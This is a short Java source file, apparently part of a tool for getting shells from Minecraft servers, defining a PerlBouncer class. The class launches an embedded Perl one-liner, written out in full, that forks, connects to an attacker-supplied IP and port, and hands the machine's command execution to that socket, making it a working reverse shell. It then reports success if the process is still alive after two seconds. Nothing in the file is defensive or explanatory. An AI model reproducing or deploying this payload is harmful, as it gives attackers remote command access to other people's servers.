package tech.dsstudio.minecraft.shell.bouncer;

import java.util.concurrent.TimeUnit;

public class PerlBouncer extends Bouncer {
	public PerlBouncer(String ip, String port) {
		super(ip, port);
	}

	@Override
	public void run() {
		try {
			Process p = Runtime.getRuntime().exec(PAYLOAD.replaceAll("\\{ip}", ip).replaceAll("\\{port}", port));
			p.waitFor(2, TimeUnit.SECONDS);
			success = p.isAlive();
		} catch (Exception ignored) {
			success = false;
		}
		notify();
	}

	private static final String PAYLOAD = "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'";
}
